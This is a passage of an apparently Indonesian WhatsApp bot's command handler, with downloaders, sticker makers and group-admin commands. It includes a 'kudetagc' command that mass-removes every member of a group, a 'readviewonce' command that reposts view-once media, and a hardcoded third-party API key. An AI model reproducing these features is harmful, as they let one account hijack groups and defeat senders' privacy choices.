if (!isOwner) return xreplybugbutton('Khusus Owner')
if (!q) return payreply(".reactch linkpesan 😂")
if (!args[0] || !args[1]) return payreply("Wrong Format")
if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = args[0].split('/')[4]
let serverId = args[0].split('/')[5]
let res = await depayy.newsletterMetadata("invite", result)
await depayy.newsletterReactMessage(res.id, serverId, args[1])
xreplybugbutton(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break;   

  case 'sertifikattolol': {
if (args.length === 0) {
await depayy.sendMessage(m.chat, { text: "❗ Silakan masukkan teks untuk sertifikat.\n\nContoh: *.tolol Jamal*" }, { quoted: m });
break; }
const text = args.join(" ");
const imageUrl = `https://api.siputzx.my.id/api/m/sertifikat-tolol?text=${encodeURIComponent(text)}`;
try {
await depayy.sendMessage(m.chat, { 
image: { url: imageUrl }, // Kirim langsung pakai URL gambar
caption: `🖼️ *Sertifikat Tolol Untuk ${text}*`
}, { quoted: m });
} catch (error) {
console.error("Error mengambil gambar:", error.message);
await depayy.sendMessage(m.chat, { text: "❌ Gagal mengambil gambar. Pastikan API aktif atau coba lagi nanti!" }, { quoted: m })}
break; }

case "clsesi": case "clearsession": {
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./library/database/sampah/" + u)
}
payreply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "unblok": {
if (!isOwner) return payreply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return payreply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await depayy.updateBlockStatus(mem, "unblock");
if (m.isGroup) depayy.sendMessage(m.chat, {text: `Berhasil membuka blokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "yts": {
if (!text) return m.reply(example('we dont talk'))
await depayy.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await depayy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "capcut": {
if (!text) return payreply(example("linknya"))
if (!text.startsWith('https://')) return payreply("Link tautan tidak valid")
await depayy.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/download/capcut?url=${text}`).then(async (res) => {
if (!res.status) return payreply("Error! Result Not Found")
await depayy.sendMessage(m.chat, {video: {url: res.result.video}, mimetype: "video/mp4", caption: "*Sukses*"}, {quoted: m})
await depayy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gitclone": {
if (!text) return m.reply(example("https://github.com/Depay/Nika"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    depayy.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! repositori tidak ditemukan`)
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await depayy.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: depayy.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Sukses*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await depayy.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await depayy.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Sukses*`}, {quoted: m})
}
}).catch(e => console.log(e))
await depayy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await depayy.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await depayy.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listgc": case "listgrup": {
if (!isOwner) return
let teks = `\n *List all group chat*\n`
let a = await depayy.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cekidch": case "idch": {
if (!text) return payreply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await depayy.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return payreply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pin": case "pinterest": {
if (!text) return m.reply(example("One Piece"))
await depayy.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: depayy.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await depayy.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await depayy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ai": case "gpt": case "openai": {
let talk = text ? text : "hai"
await fetchJson("https://api.skyzopedia.us.kg/api/ai/openai-prompt?prompt=Sekarang Kamu Adalah Nika-Ai dan selalu gunakan bahasa Indonesia saat menjawab semua pertanyaan&msg=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "brat": {
          if (!text) return Reply(`Cara Penggunaan:\n${prefix+command} Depay ganteng`) 
                                               try {
                                                       await depayy.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
                                                               const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
                                                                       const response = await axios.get(url, { responseType: "arraybuffer" });
                                                                               const sticker = new Sticker(response.data, {
                                                                                           pack: "Stiker By",
                                                                                                       author: "Depayy",
                                                                                                                   type: "image/png",
                                                                                                                           });
                                                                                                                                   const stikerBuffer = await sticker.toBuffer();
                                                                                                                                           await depayy.sendMessage(m.chat, { sticker: stikerBuffer }, { quoted: m });
                                                                                                                                               } catch (err) {
                                                                                                                                                       console.error("Error:", err);
                                                                                                                                                               await depayy.sendMessage(m.chat, {
                                                                                                                                                                           text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat. Coba lagi nanti.",
                                                                                                                                                                                   }, { quoted: m });
                                                                                                                                                                                       }
                                                                                                                                                                                      
                                                                                                                                                                                      }
                                                                                          break 
                                                                                           case "bratvid": {
          if (!text) return payreply(`Cara Penggunaan:\n${prefix+command} Depay ganteng`) 
                                               try {
                                                       await depayy.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
                                                               const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=true`;
                                                                       const response = await axios.get(url, { responseType: "arraybuffer" });
                                                                               const sticker = new Sticker(response.data, {
                                                                                           pack: "Stiker By",
                                                                                                       author: "Depayy",
                                                                                                                   type: "image/png",
                                                                                                                           });
                                                                                                                                   const stikerBuffer = await sticker.toBuffer();
                                                                                                                                           await depayy.sendMessage(m.chat, { sticker: stikerBuffer }, { quoted: m });
                                                                                                                                               } catch (err) {
                                                                                                                                                       console.error("Error:", err);
                                                                                                                                                               await depayy.sendMessage(m.chat, {
                                                                                                                                                                           text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat. Coba lagi nanti.",
                                                                                                                                                                                   }, { quoted: m });
                                                                                                                                                                                       }
                                                                                                                                                                                      
                                                                                                                                                                                      }                                                                                   
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await depayy.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await depayy.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return depayy.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return depayy.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return depayy.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await depayy.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'depayyy.png');

let teks = directLink.toString()
await depayy.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tourl2": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await depayy.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('postimages.org');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'depayyy.png');
let teks = directLink.toString()
await depayy.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "hd": {
if (!quoted) return payreply(`Balas gambar dengan caption ${prefix + command}`);
if (!/image/.test(mime)) return payreply(example("dengan kirim/reply foto"))
await depayy.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
try {
const { remini } = require("./library/hd.js");
let media = await quoted.download();
let enhanced = await remini(media, "enhance"); // Enhance pertama
enhanced = await remini(enhanced, "enhance"); // Enhance kedua
enhanced = await remini(enhanced, "enhance"); // Enhance ketiga    
depayy.sendFile(m.chat, enhanced, "", "_Sukses Membuat HD 3x Enhance✅_", m);
} catch (err) {
console.error(err);
await depayy.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "add": {
if (!m.isGroup) return payreply(mess.group)
if (!isOwner && !m.isAdmin) return payreply(mess.admin)
if (!m.isBotAdmin) return payreply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await depayy.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return payreply("Nomor tidak terdaftar di whatsapp")
const res = await depayy.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kick": case "kik": {
if (!m.isGroup) return payreply(mess.group)
if (!isOwner && !m.isAdmin) return payreply(mess.admin)
if (!m.isBotAdmin) return payreply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await depayy.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return payreply("Nomor tidak terdaftar di whatsapp")
const res = await depayy.groupParticipantsUpdate(m.chat, [input], 'remove')
await payreply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return payreply(example("@tag/reply"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "leave": {
if (!isOwner) return payreply(mess.owner)
if (!m.isGroup) return payreply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await depayy.groupLeave(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetlinkgc": {
if (!isOwner) return payreply(mess.owner)
if (!m.isGroup) return payreply(mess.group)
if (!m.isBotAdmin) return payreply(mess.botAdmin)
await depayy.groupRevokeInvite(m.chat)
payreply("Berhasil mereset link grup ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tagall": {
if (!m.isGroup) return payreply(mess.group)
if (!isOwner && !m.isAdmin) return payreply(mess.admin)
if (!text) return payreply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await depayy.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "linkgc": {
if (!m.isGroup) return payreply(mess.group)
if (!m.isBotAdmin) return payreply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await depayy.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await depayy.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ht": case "hidetag": {
if (!m.isGroup) return payreply(mess.group)
if (!isOwner && !m.isAdmin) return payreply(mess.admin)
if (!text) return payreply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await depayy.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joingc": case "join": {
if (!isOwner) return payreply(mess.owner)
if (!text) return payreply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return payreply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await depayy.groupAcceptInvite(result)
payreply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "get": case "g": {
if (!isOwner) return payreply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
payreply(JSON.stringify(data, null, 2))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joinch": case "joinchannel": {
if (!isOwner) return payreply(mess.owner)
if (!text && !m.quoted) return payreply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return payreply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await depayy.newsletterMetadata("invite", result)
await depayy.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoread": {
if (!isOwner) return payreply(mess.owner)
if (!text) return payreply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autoread == true) return payreply(`*Autoread* sudah aktif!`)
global.db.settings.autoread = true
return m.reply("Berhasil menyalakan *autoread*")
} else if (teks == "off") {
if (global.db.settings.autoread == false) return payreply(`*Autoread* tidak aktif!`)
global.db.settings.autoread = false
return payreply("Berhasil mematikan *autoread*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autopromosi": {
if (!isOwner) return payreply(mess.owner)
if (!text) return payreply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return m.reply(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return m.reply("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return payreply(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return payreply("Berhasil mematikan *autopromosi*")
} else return payreply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autotyping": {
if (!isOwner) return payreply(mess.owner)
if (!text) return payreply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autotyping == true) return payreply(`*Autotyping* sudah aktif!`)
global.db.settings.autotyping = true
return payreply("Berhasil menyalakan *autotyping*")
} else if (teks == "off") {
if (global.db.settings.autotyping == false) return payreply(`*Autotyping* tidak aktif!`)
global.db.settings.autotyping = false
return payreply("Berhasil mematikan *autotyping*")
} else return payreply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoreadsw": {
if (!isOwner) return payreply(mess.owner)
if (!text) return payreply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return payreply(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return m.reply("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return m.reply(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return payreply("Berhasil mematikan *autoreadsw*")
} else return payreply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "welcome": {
if (!m.isGroup) return payreply(mess.group)
if (!isOwner) return payreply(mess.owner)
if (!text) return payreply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return payreply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return payreply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return payreply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return m.reply("Berhasil mematikan *welcome* di grup ini")
} else return payreply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink": {
if (!m.isGroup) return payreply(mess.group)
if (!isOwner) return payreply(mess.owner)
if (!text) return payreply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink == true) return payreply(`*Antilink* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = true
return payreply("Berhasil menyalakan *antilink* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink == false) return payreply(`*Antilink* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink = false
return payreply("Berhasil mematikan *antilink* di grup ini")
} else return payreply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink2": {
if (!m.isGroup) return payreply(mess.group)
if (!isOwner) return payreply(mess.owner)
if (!text) return payreply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink2 == true) return payreply(`*Antilink2* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = true
return payreply("Berhasil menyalakan *antilink2* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink2 == false) return payreply(`*Antilink2* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink2 = false
return payreply("Berhasil mematikan *antilink2* di grup ini")
} else return payreply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "mute": {
if (!m.isGroup) return payreply(mess.group)
if (!isOwner) return payreply(mess.owner)
if (!text) return payreply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return payreply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return payreply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return payreply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return payreply("Berhasil mematikan *mute* di grup ini")
} else return payreply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "blacklist": case "blacklistjpm": case "blgc": {
if (!m.isGroup) return payreply(mess.group)
if (!isOwner) return payreply(mess.owner)
if (!text) return payreply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].blacklistjpm == true) return payreply(`*Blacklistjpm* di grup ini sudah aktif!`)
global.db.groups[m.chat].blacklistjpm = true
return payreply("Berhasil menyalakan *blacklistjpm* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].blacklistjpm == false) return payreply(`*Blacklistjpm* di grup ini tidak aktif!`)
global.db.groups[m.chat].blacklistjpm = false
return payreply("Berhasil mematikan *blacklistjpm* di grup ini")
} else return payreply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return payreply(mess.group)
if (!m.isBotAdmin) return payreply(mess.botAdmin)
if (!isOwner && !m.isAdmin) return payreply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await depayy.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await depayy.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kudetagc": case "kudeta": {
if (!isOwner) return payreply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return payreply("Grup Ini Sudah Tidak Ada Member!")
await payreply("Kudeta Grup By Depay☠️")
for (let i of memberFilter) {
await depayy.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await payreply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "demote":
case "promote": {
if (!m.isGroup) return payreply(mess.group)
if (!m.isBotAdmin) return payreply(mess.botAdmin)
if (!isOwner && !m.isAdmin) return payreply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await depayy.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await depayy.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return payreply(example("@tag/6285###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addrespon": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
